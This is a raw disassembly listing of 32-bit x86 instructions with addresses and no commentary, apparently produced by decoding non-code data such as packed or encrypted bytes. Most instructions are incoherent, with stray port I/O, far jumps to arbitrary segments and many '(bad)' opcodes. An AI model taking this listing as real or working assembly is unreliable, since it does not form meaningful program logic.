  43f434:	outs   dx,DWORD PTR ds:[esi]
  43f435:	neg    BYTE PTR [ecx]
  43f437:	ret    0x691a
  43f43a:	scas   eax,DWORD PTR es:[edi]
  43f43b:	ins    BYTE PTR es:[edi],dx
  43f43c:	add    ah,ah
  43f43e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f43f:	pop    eax
  43f440:	lea    ebx,[ebx+edi*4-0x1fe95770]
  43f447:	pop    ebx
  43f448:	call   0xb50e:0x6ad976fd
  43f44f:	xchg   esp,eax
  43f450:	out    0x26,eax
  43f452:	pop    esp
  43f453:	ds mov ch,0xfd
  43f456:	call   0x6522d041
  43f45b:	mov    es,WORD PTR [edi+edx*1+0x12]
  43f45f:	dec    eax
  43f460:	and    bl,ch
  43f462:	out    dx,eax
  43f463:	xchg   esp,eax
  43f464:	mov    ch,0x9b
  43f466:	push   es
  43f467:	fld    QWORD PTR [edx+esi*4+0x6b]
  43f46b:	mov    ds:0x96850b5c,al
  43f470:	and    DWORD PTR gs:[eax+0xba111a],ecx
  43f477:	pop    edi
  43f478:	lahf   
  43f479:	jb     0x43f432
  43f47b:	lods   eax,DWORD PTR ds:[esi]
  43f47c:	adc    eax,0x4c78bd79
  43f481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f482:	jmp    0x43f4ca
  43f484:	push   0xfe8110d1
  43f489:	xlat   BYTE PTR ds:[ebx]
  43f48a:	lods   al,BYTE PTR ds:[esi]
  43f48b:	gs retf 0x7cab
  43f48f:	xchg   edi,eax
  43f490:	push   0x9424bece
  43f495:	stos   DWORD PTR es:[edi],eax
  43f496:	sti    
  43f497:	idiv   DWORD PTR [eax-0x671ba89f]
  43f49d:	daa    
  43f49e:	sbb    dh,cl
  43f4a0:	sbb    ecx,ecx
  43f4a2:	iret   
  43f4a3:	sub    edx,DWORD PTR [edi]
  43f4a5:	dec    ebx
  43f4a6:	stos   BYTE PTR es:[edi],al
  43f4a7:	inc    ecx
  43f4a8:	aad    0x9a
  43f4aa:	fwait
  43f4ab:	rcl    ebp,1
  43f4ad:	loope  0x43f485
  43f4af:	pop    edi
  43f4b0:	gs loope 0x43f4ec
  43f4b3:	xchg   esi,eax
  43f4b4:	push   es
  43f4b5:	sbb    DWORD PTR [ecx+0x62ed91e4],esi
  43f4bb:	sbb    edi,ecx
  43f4bd:	pop    es
  43f4be:	mov    ecx,0xc17839a3
  43f4c3:	jl     0x43f4ef
  43f4c5:	fwait
  43f4c6:	lea    ebx,[edi+0xd2cc98a]
  43f4cc:	mov    ds:0xc716eb5f,al
  43f4d1:	and    BYTE PTR [edi+0x2c],dh
  43f4d4:	push   edi
  43f4d5:	push   0x314aca7d
  43f4da:	lods   eax,DWORD PTR ds:[esi]
  43f4db:	and    esp,DWORD PTR ds:0x193f9788
  43f4e1:	cmp    DWORD PTR [ebx-0x6],esp
  43f4e4:	stc    
  43f4e5:	fisttp DWORD PTR [ebx+eiz*1-0x22]
  43f4e9:	cdq    
  43f4ea:	or     esi,DWORD PTR [ecx]
  43f4ec:	and    eax,0xaff5ebfa
  43f4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f4f2:	and    al,0x8b
  43f4f4:	inc    esp
  43f4f5:	je     0x43f525
  43f4f7:	mov    ch,0x21
  43f4f9:	stos   BYTE PTR es:[edi],al
  43f4fa:	push   ebx
  43f4fb:	in     al,0xeb
  43f4fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f4fe:	dec    ebx
  43f4ff:	scas   al,BYTE PTR es:[edi]
  43f500:	pop    edx
  43f501:	mov    ebp,0x8a4f7dfa
  43f506:	retf   0xf68a
  43f509:	cdq    
  43f50a:	and    eax,0x5b5c1c25
  43f50f:	inc    ecx
  43f510:	int3   
  43f511:	mov    ds:0xbbd41a8b,eax
  43f516:	ins    BYTE PTR es:[edi],dx
  43f517:	push   cs
  43f518:	(bad)  [ecx-0x21]
  43f51b:	dec    ecx
  43f51c:	and    eax,0xb7c3b799
  43f521:	stos   BYTE PTR es:[edi],al
  43f522:	xor    BYTE PTR ds:0x7bcba551,dl
  43f528:	loop   0x43f56a
  43f52a:	and    ecx,ebp
  43f52c:	add    esp,DWORD PTR [esi+0x84ef47d]
  43f532:	mov    cl,0xd4
  43f534:	clc    
  43f535:	outs   dx,DWORD PTR ds:[esi]
  43f536:	dec    edx
  43f537:	mov    ecx,0xe6f2e225
  43f53c:	xchg   esi,eax
  43f53d:	cmc    
  43f53e:	jle    0x43f4c2
  43f540:	dec    ebx
  43f541:	mov    DWORD PTR [ebp+0x6c],edx
  43f544:	pop    eax
  43f545:	shl    DWORD PTR [ebx-0x7a],cl
  43f548:	ror    DWORD PTR [eax+esi*2+0x71],1
  43f54c:	cmc    
  43f54d:	sub    eax,esi
  43f54f:	call   0xaab7a468
  43f554:	pop    ds
  43f555:	cdq    
  43f556:	sub    al,0xb7
  43f558:	inc    ebx
  43f559:	repz mov cl,0x2c
  43f55c:	and    eax,0x194b4f4d
  43f561:	popa   
  43f562:	or     DWORD PTR [ebx],eax
  43f564:	ss es pop ds
  43f567:	sahf   
  43f568:	push   ds
  43f569:	jmp    0x2697147c
  43f56e:	cmp    bh,dh
  43f570:	or     BYTE PTR [ebp-0x657f3f35],bl
  43f576:	xchg   esi,eax
  43f577:	push   0xffffff90
  43f579:	clc    
  43f57a:	inc    edx
  43f57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f57c:	nop
  43f57d:	add    BYTE PTR [ebp-0x7262c94c],dh
  43f583:	xor    eax,DWORD PTR [ebp-0x1506186e]
  43f589:	(bad)  
  43f58a:	retf   
  43f58b:	cmp    DWORD PTR [eax+eax*8],esi
  43f58e:	mov    ecx,0xb2799f28
  43f593:	push   0x7a
  43f595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f596:	mov    ebp,DWORD PTR [ecx]
  43f598:	fsub   QWORD PTR [edx+0x59583a91]
  43f59e:	cdq    
  43f59f:	stc    
  43f5a0:	push   esp
  43f5a1:	mov    esp,0x911e950e
  43f5a6:	adc    eax,0x3ba6f19b
  43f5ab:	fild   DWORD PTR cs:[ebp+0x46048043]
  43f5b2:	stos   DWORD PTR es:[edi],eax
  43f5b3:	jbe    0x43f54c
  43f5b5:	js     0x43f56f
  43f5b7:	inc    esp
  43f5b8:	lods   al,BYTE PTR ds:[esi]
  43f5b9:	shl    BYTE PTR [edi],0x93
  43f5bc:	xor    eax,0x5bf6376e
  43f5c1:	mov    dh,0x3f
  43f5c3:	mov    edx,0xaabd59c5
  43f5c8:	iret   
  43f5c9:	xchg   edx,eax
  43f5ca:	jle    0x43f5c2
  43f5cc:	mov    ah,0x90
  43f5ce:	mov    al,0x28
  43f5d0:	cwde   
  43f5d1:	xchg   edx,eax
  43f5d2:	dec    edi
  43f5d3:	push   eax
  43f5d4:	and    DWORD PTR [ecx],esp
  43f5d6:	das    
  43f5d7:	mov    BYTE PTR [edi+edi*4+0x9],al
  43f5db:	jo     0x43f632
  43f5dd:	cli    
  43f5de:	xor    eax,0x28f91b7f
  43f5e3:	mov    bl,0x7
  43f5e5:	dec    ecx
  43f5e6:	or     edx,edx
  43f5e8:	aad    0x1f
  43f5ea:	push   cs
  43f5eb:	out    0x4b,eax
  43f5ed:	adc    esp,DWORD PTR [ebx-0x2d6d962]
  43f5f3:	push   edi
  43f5f4:	and    eax,0x985e2041
  43f5f9:	xchg   DWORD PTR [esi-0x6c9c1951],esp
  43f5ff:	push   esi
  43f600:	(bad)  
  43f601:	test   al,0xa2
  43f603:	jecxz  0x43f58c
  43f605:	ds dec ebx
  43f607:	inc    edi
  43f608:	dec    edi
  43f609:	cmp    BYTE PTR [eax-0x212efbac],0x22
  43f610:	mov    ch,0x2f
  43f612:	(bad)  
  43f613:	repz and al,0xea
  43f616:	out    0x34,al
  43f618:	push   ds
  43f619:	cdq    
  43f61a:	mov    ch,0x79
  43f61c:	mov    al,0x76
  43f61e:	xor    al,0x71
  43f620:	xor    BYTE PTR [eax-0x2d],dh
  43f623:	jp     0x43f65a
  43f625:	sar    DWORD PTR [eax+ebp*8-0xd322da4],1
  43f62c:	pop    ds
  43f62d:	cmp    DWORD PTR [eax-0x7d],ebx
  43f630:	stc    
  43f631:	in     eax,dx
  43f632:	jbe    0x43f5eb
  43f634:	push   es
  43f635:	push   0x52470c6b
  43f63a:	lahf   
  43f63b:	push   ebx
  43f63c:	push   ebp
  43f63d:	lahf   
  43f63e:	ds out 0x9d,eax
  43f641:	push   edx
  43f642:	sub    cl,BYTE PTR [eax]
  43f644:	sbb    BYTE PTR [ecx-0x3],cl
  43f647:	loop   0x43f627
  43f649:	retf   
  43f64a:	or     dh,BYTE PTR [eax-0x6b]
  43f64d:	adc    eax,0x2151b51c
  43f652:	and    bl,BYTE PTR [ebx+0x3e]
  43f655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f656:	int    0xe7
  43f658:	and    bh,BYTE PTR [ecx+0x4d]
  43f65b:	retw   
  43f65d:	mov    gs,esp
  43f65f:	xor    DWORD PTR [esi+0x15e80ba0],edi
  43f665:	xor    edx,DWORD PTR [eax+0x295e5578]
  43f66b:	sub    eax,0x44c2e83a
  43f670:	icebp  
  43f671:	jne    0x43f68a
  43f673:	pop    ebp
  43f674:	arpl   WORD PTR [ebx+edi*8-0x293ec68e],sp
  43f67b:	retf   0x9906
  43f67e:	in     eax,dx
  43f67f:	rcl    DWORD PTR [ebp+edx*1-0x46],1
  43f683:	xchg   esp,eax
  43f684:	repnz inc esi
  43f686:	sub    al,dl
  43f688:	inc    ebp
  43f689:	mov    eax,ds:0xb904f11f
  43f68e:	sub    esp,DWORD PTR gs:0x6d29a109
  43f695:	jge    0x43f6a3
  43f697:	pop    ebx
  43f698:	push   es
  43f699:	adc    ebx,esp
  43f69b:	pusha  
  43f69c:	and    cl,BYTE PTR [edx]
  43f69e:	imul   esp,DWORD PTR [ebx+ebx*8-0x69],0x1f0020a8
  43f6a6:	xor    al,0xc4
  43f6a8:	pop    edx
  43f6a9:	sbb    al,0xed
  43f6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f6ac:	inc    ebp
  43f6ad:	sub    BYTE PTR [ebx+0x5a],bl
  43f6b0:	inc    ebx
  43f6b1:	popf   
  43f6b2:	jmp    0x43f656
  43f6b4:	push   ebx
  43f6b5:	jmp    0x4b44:0x9f32823d
  43f6bc:	je     0x43f724
  43f6be:	pop    edi
  43f6bf:	jne    0x43f676
  43f6c1:	jns    0x43f71f
  43f6c3:	or     cl,BYTE PTR [ebp-0x5a0f6962]
  43f6c9:	mov    al,ds:0xcb700f7b
  43f6ce:	mov    ebx,0xa35f3822
  43f6d3:	and    dl,BYTE PTR [ebx+edx*2]
  43f6d6:	inc    edi
  43f6d7:	xchg   ebp,eax
  43f6d8:	adc    eax,0xff25b1c
  43f6dd:	lahf   
  43f6de:	stos   DWORD PTR es:[edi],eax
  43f6df:	and    eax,DWORD PTR [esi]
  43f6e1:	stos   DWORD PTR es:[edi],eax
  43f6e2:	test   DWORD PTR [edx],0x31e0c131
  43f6e8:	adc    BYTE PTR [ecx-0x50],dh
  43f6eb:	xchg   esp,eax
  43f6ec:	lahf   
  43f6ed:	inc    eax
  43f6ee:	or     al,0xcb
  43f6f0:	push   ss
  43f6f1:	inc    edi
  43f6f2:	mov    DWORD PTR [edx-0x7b],ebx
  43f6f5:	lahf   
  43f6f6:	int3   
  43f6f7:	push   esp
  43f6f8:	xlat   BYTE PTR ds:[ebx]
  43f6f9:	mov    ebx,DWORD PTR [ecx]
  43f6fb:	sar    BYTE PTR [ecx],1
  43f6fd:	pop    ss
  43f6fe:	jno    0x43f743
  43f700:	inc    ecx
  43f701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f702:	xchg   ebx,eax
  43f703:	or     BYTE PTR [ebx-0x58edce0d],dl
  43f709:	test   al,0xeb
  43f70b:	out    dx,al
  43f70c:	xchg   ecx,eax
  43f70d:	pop    ss
  43f70e:	and    ebp,DWORD PTR [ebx+0x38]
  43f711:	(bad)  [edx-0x48b69eb6]
  43f717:	add    al,0x14
  43f719:	sahf   
  43f71a:	daa    
  43f71b:	fnsave ds:0xa7f07cfe
  43f721:	mov    DWORD PTR [edi-0x57],ebp
  43f724:	sbb    al,0x49
  43f726:	sbb    bh,BYTE PTR [eax+0x6e]
  43f729:	out    0x1,al
  43f72b:	ret    
  43f72c:	pop    ebp
  43f72d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f72e:	mov    edi,edx
  43f730:	not    DWORD PTR [ecx]
  43f732:	fld    TBYTE PTR [edx+0x26]
  43f735:	ret    0x68c3
  43f738:	mov    edi,0x1ad52380
  43f73d:	xor    bh,al
  43f73f:	inc    ebp
  43f740:	and    al,0x9c
  43f742:	dec    ebx
  43f743:	push   ebx
  43f744:	xchg   DWORD PTR [ecx],esp
  43f746:	test   al,0x5c
  43f748:	xchg   esi,eax
  43f749:	test   eax,0xf92fb1ea
  43f74e:	mov    ebx,0xc4a7d6c4
  43f753:	jge    0x43f7ca
  43f755:	pushf  
  43f756:	and    eax,ebp
  43f758:	stos   DWORD PTR es:[edi],eax
  43f759:	cs fwait
  43f75b:	addr16 hlt 
  43f75d:	dec    edx
  43f75e:	mov    ds:0x3ddd235c,eax
  43f763:	in     al,0x24
  43f765:	pop    esp
  43f766:	push   ebx
  43f767:	rcr    BYTE PTR [ebp+0x7f],1
  43f76a:	lahf   
  43f76b:	rcr    BYTE PTR ds:0xf4238c9,0xff
  43f772:	stc    
  43f773:	sub    esp,DWORD PTR [ecx+0x56d9b3f8]
  43f779:	test   DWORD PTR [eax+0x1fbaaa24],edi
  43f77f:	enter  0x8c85,0xd9
  43f783:	out    dx,eax
  43f784:	mov    WORD PTR [ecx-0x17],es
  43f787:	aam    0x17
  43f789:	jmp    0x13fd1750
  43f78e:	lods   eax,DWORD PTR ds:[esi]
  43f78f:	mov    eax,0x117b9c00
  43f794:	fidivr DWORD PTR [esi+esi*8-0x5]
  43f798:	xor    eax,0x16be85da
  43f79d:	jecxz  0x43f767
  43f79f:	xchg   esp,eax
  43f7a0:	(bad)  
  43f7a2:	push   0xa13bbfc1
  43f7a7:	out    0x96,eax
  43f7a9:	sahf   
  43f7aa:	jnp    0x43f736
  43f7ac:	out    dx,al
  43f7ad:	shr    dl,1
  43f7af:	addr16 ss pushf 
  43f7b2:	imul   ebx,DWORD PTR [esi],0xffffffac
  43f7b5:	jg     0x43f73a
  43f7b7:	sub    eax,0x65b84ec4
  43f7bc:	xor    eax,0x7c34bab2
  43f7c1:	push   cs
  43f7c2:	xchg   BYTE PTR [esi+0x46],al
  43f7c5:	dec    ecx
  43f7c6:	cmp    eax,0xb00d23dd
  43f7cb:	jno    0x43f793
  43f7cd:	or     ecx,DWORD PTR [edx+0x29a8f688]
  43f7d3:	in     eax,0x18
  43f7d5:	retf   
  43f7d6:	cmp    eax,0xcb9dd174
  43f7db:	in     al,dx
  43f7dc:	mov    esi,0x7d9753e7
  43f7e1:	sub    eax,0xc0361553
  43f7e6:	xchg   BYTE PTR [esi+0x4c9c260],ah
  43f7ec:	push   esi
  43f7ed:	cmc    
  43f7ee:	(bad)
  43f7f1:	fdiv   DWORD PTR [ebp+0x30632ee7]
  43f7f7:	out    dx,al
  43f7f8:	xor    BYTE PTR [ecx],ch
  43f7fa:	push   0x895051ef
  43f7ff:	or     al,0x5a
  43f801:	push   0xb5b64f4c
  43f806:	lea    eax,[edx]
  43f808:	arpl   WORD PTR cs:[edi+0x6be30459],sp
  43f80f:	jmp    0x64fb0e8f
  43f814:	adc    eax,0x450bcbc3
  43f819:	jle    0x43f86c
  43f81b:	repz scas eax,DWORD PTR es:[edi]
  43f81d:	dec    ecx
  43f81e:	jg     0x43f884
  43f820:	sbb    eax,0xa88cf5e9
  43f825:	jmp    0xcba2:0xf6f945e0
  43f82c:	stc    
  43f82d:	test   al,0x52
  43f82f:	mov    bl,0xf8
  43f831:	jo     0x43f7e4
  43f833:	adc    al,0xde
  43f835:	call   DWORD PTR [eax+0x51]
  43f838:	cmp    eax,DWORD PTR [esi-0x50]
  43f83b:	and    al,0xd9
  43f83d:	xchg   BYTE PTR [ebx+0x2a],bh
  43f840:	cmc    
  43f841:	fnstsw WORD PTR [edx-0x7c6580d]
  43f847:	jo     0x43f86b
  43f849:	stc    
  43f84a:	and    al,0x40
  43f84c:	mov    edi,0xf171cafc
  43f851:	pushf  
  43f852:	jmp    0x43f8cd
  43f854:	sub    esi,ebx
  43f856:	mov    al,0xdb
  43f858:	adc    DWORD PTR [eax-0xb],ecx
  43f85b:	clc    
  43f85c:	mov    bl,0x81
  43f85e:	mov    ebx,0x83c03b94
  43f863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f864:	add    al,0xa5
  43f866:	jnp    0x43f891
  43f868:	bnd ds jae 0x43f7ef
  43f86c:	loopne 0x43f8d1
  43f86e:	jb     0x43f831
  43f870:	and    al,0xe9
  43f872:	(bad)  
  43f873:	mov    ds:0x2bbd79f1,al
  43f878:	out    0xa4,eax
  43f87a:	sbb    ebx,DWORD PTR [ebp+0x67aadcc6]
  43f880:	adc    dh,al
  43f882:	les    edi,FWORD PTR [edi-0x6b47f723]
  43f888:	dec    eax
  43f889:	popf   
  43f88a:	xchg   esp,eax
  43f88b:	cli    
  43f88c:	xchg   ebp,eax
  43f88d:	out    0x43,eax
  43f88f:	jmp    0x43f8db
  43f891:	mov    ds:0x917fc7f,al
  43f896:	and    cl,BYTE PTR [edi]
  43f898:	int    0xec
  43f89a:	push   cs
  43f89b:	sbb    DWORD PTR [ebp+eiz*4-0x75],edi
  43f89f:	push   0xfffffffa
  43f8a1:	pop    edi
  43f8a2:	mov    eax,ds:0x73eaf9a7
  43f8a7:	push   ecx
  43f8a8:	push   edx
  43f8a9:	push   0xffffffb6
  43f8ab:	aam    0xfb
  43f8ad:	mov    al,ds:0x9df4d8f9
  43f8b2:	imul   esi,DWORD PTR [ebx],0x6c
  43f8b5:	jmp    0x43f85d
  43f8b7:	loop   0x43f909
  43f8b9:	and    edi,DWORD PTR [ecx+0x43]
  43f8bc:	cmc    
  43f8bd:	cmp    al,0xb6
  43f8bf:	sti    
  43f8c0:	std    
  43f8c1:	xor    eax,0x828edf5
  43f8c6:	jecxz  0x43f859
  43f8c8:	add    eax,0x15eb0388
  43f8cd:	push   edi
  43f8ce:	xchg   ecx,eax
  43f8cf:	push   es
  43f8d0:	inc    edi
  43f8d1:	jns    0x43f8ff
  43f8d3:	clc    
  43f8d4:	aaa    
  43f8d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f8d6:	mov    al,0xef
  43f8d8:	mov    dh,0xb1
  43f8da:	or     al,0x2
  43f8dc:	pop    ss
  43f8dd:	shl    BYTE PTR [esi-0x67],0x53
  43f8e1:	imul   ebx,DWORD PTR [ebx+0x6b],0x85a8b59d
  43f8e8:	mov    bl,0x5
  43f8ea:	sbb    bl,dh
  43f8ec:	fsubr  QWORD PTR [edx-0x2846ac7e]
  43f8f2:	jecxz  0x43f8b1
  43f8f4:	xchg   ecx,esp
  43f8f6:	jo     0x43f8f8
  43f8f8:	scas   al,BYTE PTR es:[edi]
  43f8f9:	mov    al,ds:0xc286d5e
  43f8fe:	fisub  WORD PTR ds:0x34b5ce48
  43f904:	lods   al,BYTE PTR ds:[esi]
  43f905:	and    al,0x97
  43f907:	cmp    ch,0x5a
  43f90a:	int    0xb1
  43f90c:	jmp    0xcaffd8b4
  43f911:	adc    al,0xbd
  43f913:	mov    bh,0x16
  43f915:	or     DWORD PTR [eax],ebp
  43f917:	push   ebx
  43f918:	push   edi
  43f919:	fisubr DWORD PTR [edx-0x22]
  43f91c:	cmp    dl,bl
  43f91e:	mov    ebp,DWORD PTR [esi]
  43f920:	in     al,dx
  43f921:	or     al,0x46
  43f923:	cmp    DWORD PTR [ebx],esp
  43f925:	je     0x43f8e0
  43f927:	pop    ebp
  43f928:	and    al,0x29
  43f92a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f92b:	cmp    edx,DWORD PTR [ecx-0x7c]
  43f92e:	xor    al,BYTE PTR [edx+eax*2]
  43f931:	sahf   
  43f932:	mov    esi,DWORD PTR ds:0x2c87270b
  43f938:	sbb    bh,BYTE PTR [edx]
  43f93a:	test   eax,0xb9c97f34
  43f93f:	je     0x43f8f9
  43f941:	fsubr  QWORD PTR [ebp+edx*2-0x13f42afb]
  43f948:	add    eax,0x1b491c1e
  43f94d:	sub    edi,edi
  43f94f:	mov    bl,0x1c
  43f951:	pop    ss
  43f952:	enter  0x2176,0xa4
  43f956:	fwait
  43f957:	lock cmp al,0x2f
  43f95a:	sbb    ebx,DWORD PTR [ebp+eiz*4+0x18d0f716]
  43f961:	mov    ecx,0x8475dbe2
  43f966:	xchg   edx,eax
  43f967:	addr16 lahf 
  43f969:	call   0x1d03:0xe232fa5b
  43f970:	test   BYTE PTR [edx+0x68f29e82],ch
  43f976:	mov    dl,0x64
  43f978:	pop    esi
  43f979:	or     DWORD PTR [edi+0x2e72847],0x6b
  43f980:	test   DWORD PTR [ebx],ecx
  43f982:	mov    ebx,0x625092ee
  43f987:	inc    ecx
  43f988:	sbb    eax,0xea4f8d9
  43f98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f98e:	pusha  
  43f98f:	pop    eax
  43f990:	popf   
  43f991:	shr    BYTE PTR [ebx],1
  43f993:	jp     0x43f944
  43f995:	arpl   ax,ax
  43f997:	or     eax,0xa0dfb21e
  43f99c:	push   ds
  43f99d:	stc    
  43f99e:	neg    ah
  43f9a0:	sbb    DWORD PTR [ebp-0x359a7b01],0x12
  43f9a7:	retf   0x9989
  43f9aa:	push   0xdba0fda3
  43f9af:	in     eax,0x2d
  43f9b1:	fisttp WORD PTR [esi]
  43f9b3:	adc    al,0x14
  43f9b5:	pop    ebx
  43f9b6:	dec    ebp
  43f9b7:	add    DWORD PTR [ecx],0xd310b8f3
  43f9bd:	inc    ebx
  43f9be:	mov    ah,0xf4
  43f9c0:	xchg   edi,eax
  43f9c1:	mov    eax,ds:0xfd6e558b
  43f9c6:	jmp    0x91d6732c
  43f9cb:	scas   eax,DWORD PTR es:[edi]
  43f9cc:	stc    
  43f9cd:	mov    esp,es
  43f9cf:	mov    ah,0xd1
  43f9d1:	test   eax,0x9dc02b93
  43f9d6:	cmp    esi,DWORD PTR [ebp+eax*2+0x27]
  43f9da:	imul   esp,DWORD PTR [ecx+0x72444241],0x19
  43f9e1:	fnstcw WORD PTR [eax]
  43f9e3:	push   ds
  43f9e4:	mov    ds:0x5761d650,al
  43f9e9:	or     DWORD PTR [esi+edx*8+0x69],ebp
  43f9ed:	inc    ebx
  43f9ee:	rol    ch,1
  43f9f0:	xchg   DWORD PTR [esi+esi*1-0x785f0f15],ecx
  43f9f7:	test   eax,0xb52ac4c3
  43f9fc:	sbb    eax,0x56de31af
  43fa01:	pop    DWORD PTR [edi-0x4037a559]
  43fa07:	mov    al,0x9f
  43fa09:	jg     0x43fa34
  43fa0b:	xlat   BYTE PTR ds:[ebx]
  43fa0c:	gs push edx
  43fa0e:	xor    eax,0x4456afe8
  43fa13:	xor    al,0x75
  43fa15:	sti    
  43fa16:	mov    BYTE PTR [edi-0x1abc46bb],dl
  43fa1c:	sub    al,0x3
  43fa1e:	rcr    BYTE PTR [edx],1
  43fa20:	test   BYTE PTR [ecx-0x42],al
  43fa23:	push   esp
  43fa24:	rcl    DWORD PTR [edi-0x24a2ec7],cl
  43fa2a:	imul   esi,edx,0x6949f4af
  43fa30:	sub    ecx,DWORD PTR [ecx+0x9a1545d]
  43fa36:	aad    0x85
  43fa38:	pop    edi
  43fa39:	mov    ch,0x2b
  43fa3b:	jns    0x43fab2
  43fa3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa3e:	out    dx,eax
  43fa3f:	repz mov edx,0xf62af03e
  43fa45:	mov    al,ds:0x59cbdc05
  43fa4a:	mov    al,0x14
  43fa4c:	not    eax
  43fa4e:	inc    edx
  43fa4f:	outs   dx,BYTE PTR ds:[esi]
  43fa50:	cmc    
  43fa51:	sub    al,0xae
  43fa53:	jmp    0x5406651b
  43fa58:	cmp    cl,bh
  43fa5a:	add    al,0x93
  43fa5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa5d:	xor    cl,bl
  43fa5f:	aaa    
  43fa60:	std    
  43fa61:	mov    ch,0xf0
  43fa63:	lock pop ebx
  43fa65:	retf   0x25bc
  43fa68:	and    BYTE PTR [eax-0x1490c2a5],ah
  43fa6e:	push   ebx
  43fa6f:	retf   0xb98e
  43fa72:	and    al,0xec
  43fa74:	sub    eax,0xaaee5a45
  43fa79:	ins    BYTE PTR es:[edi],dx
  43fa7a:	mov    esi,0x6cd534
  43fa7f:	out    dx,eax
  43fa80:	imul   edx,DWORD PTR [ebp+ecx*4+0x36],0x7d4a8921
  43fa88:	jo     0x43fa64
  43fa8a:	ror    edx,0x5a
  43fa8d:	mov    bh,0x4b
  43fa8f:	test   cl,dh
  43fa91:	xor    esi,esi
  43fa93:	stos   DWORD PTR es:[edi],eax
  43fa94:	mov    esi,0xe9651b09
  43fa99:	pop    ebx
  43fa9a:	mov    dh,0x70
  43fa9c:	xor    eax,0x9164b5e5
  43faa1:	mov    ss,WORD PTR [esp+edx*4+0x6309ded6]
  43faa8:	(bad)  
  43faa9:	lahf   
  43faaa:	inc    eax
  43faab:	icebp  
  43faac:	jle    0x43fac0
  43faae:	stos   BYTE PTR es:[edi],al
  43faaf:	iret   
  43fab0:	and    al,0x42
  43fab2:	out    0x4,eax
  43fab4:	lea    esp,[ecx]
  43fab6:	retf   0xd916
  43fab9:	fwait
  43faba:	or     edx,DWORD PTR [edi-0x2511c521]
  43fac0:	xor    edx,DWORD PTR [eax]
  43fac2:	test   al,0x2d
  43fac4:	jle    0x43fa62
  43fac6:	call   0xd5f0:0x730ec586
  43facd:	idiv   DWORD PTR [ebx-0x61a93905]
  43fad3:	enter  0x6f21,0xea
  43fad7:	sar    DWORD PTR [ecx-0x4e],cl
  43fada:	xchg   edi,eax
  43fadb:	out    0x67,al
  43fadd:	xor    al,0xb8
  43fadf:	fs dec ebx
  43fae1:	out    dx,al
  43fae2:	jecxz  0x43fa8e
  43fae4:	lds    esp,FWORD PTR [ebx-0x7d6f0ddc]
  43faea:	jno    0x43fb52
  43faec:	sbb    ebp,DWORD PTR [ecx+0x6c]
  43faef:	push   ebp
  43faf0:	pop    edi
  43faf1:	fs ins BYTE PTR es:[edi],dx
  43faf3:	add    BYTE PTR [edx-0x25],dl
  43faf6:	dec    ebx
  43faf7:	(bad)  
  43faf8:	cmp    al,0xe4
  43fafa:	loope  0x43fb00
  43fafc:	repnz mov ds:0x4b28574b,al
  43fb02:	or     BYTE PTR [esi-0x5b4d0e9a],bh
  43fb08:	cmp    ebx,DWORD PTR [edx]
  43fb0a:	popf   
  43fb0b:	(bad)  
  43fb0c:	(bad)
  43fb0f:	out    0xc9,eax
  43fb11:	add    al,0xf7
  43fb13:	cmp    al,0x4a
  43fb15:	push   eax
  43fb16:	add    ebx,DWORD PTR [edx-0x33cbe601]
  43fb1c:	mov    eax,ds:0xe3a7eba6
  43fb21:	pop    ss
  43fb22:	rcr    BYTE PTR [ecx],cl
  43fb24:	test   BYTE PTR [ebx-0x669febe3],al
  43fb2a:	imul   ebp,DWORD PTR [ebp+0x1432379d],0x23
  43fb31:	cmp    edx,esi
  43fb33:	mov    esi,0x844321b7
  43fb38:	outs   dx,BYTE PTR ds:[esi]
  43fb39:	xchg   edx,eax
  43fb3a:	sbb    al,0x18
  43fb3c:	pusha  
  43fb3d:	outs   dx,DWORD PTR ds:[esi]
  43fb3e:	jp     0x43fb16
  43fb40:	inc    ebp
  43fb41:	popf   
  43fb42:	sub    BYTE PTR [ecx-0x47cf3d0a],ch
  43fb48:	jl     0x43fb6a
  43fb4a:	mov    bh,0x64
  43fb4c:	nop
  43fb4d:	pop    ss
  43fb4e:	hlt    
  43fb4f:	and    DWORD PTR [ecx],ecx
  43fb51:	jmp    0x58188842
  43fb56:	sbb    ch,al
  43fb58:	stc    
  43fb59:	jmp    0x3264:0x89256950
  43fb60:	pop    esi
  43fb61:	jns    0x43fb9e
  43fb63:	(bad)  
  43fb64:	aad    0x6d
  43fb66:	jmp    0x3171:0x366e3ef2
  43fb6d:	pop    ecx
  43fb6e:	jge    0x43fbee
  43fb70:	dec    edx
  43fb71:	and    eax,0xb7a445d7
  43fb76:	jns    0x43fbbc
  43fb78:	jne    0x43fba4
  43fb7a:	dec    edi
  43fb7b:	jmp    0x2b0d:0x97585b5f
  43fb82:	clc    
  43fb83:	jge    0x43fba1
  43fb85:	(bad)  
  43fb87:	out    0xd6,al
  43fb89:	ficomp DWORD PTR [eax+0x14]
  43fb8c:	push   0xe8b33117
  43fb91:	mov    eax,ds:0x7c216f6b
  43fb96:	sbb    al,0xd0
  43fb98:	mov    eax,DWORD PTR [eax]
  43fb9a:	ss jnp 0x43fbdf
  43fb9d:	jp     0x43fb55
  43fb9f:	(bad)
  43fba3:	mov    ebp,esp
  43fba5:	fwait
  43fba6:	pop    esp
  43fba7:	jmp    0x43fbce
  43fba9:	xor    al,0x1e
  43fbab:	sub    dl,0x6b
  43fbae:	xchg   edx,eax
  43fbaf:	inc    edi
  43fbb0:	adc    eax,0x32480bc2
  43fbb5:	ret    
  43fbb6:	and    eax,0xb53532f4
  43fbbb:	cmp    BYTE PTR [eax],ah
  43fbbd:	stc    
  43fbbe:	repnz imul edi,eax,0x55
  43fbc2:	pop    ds
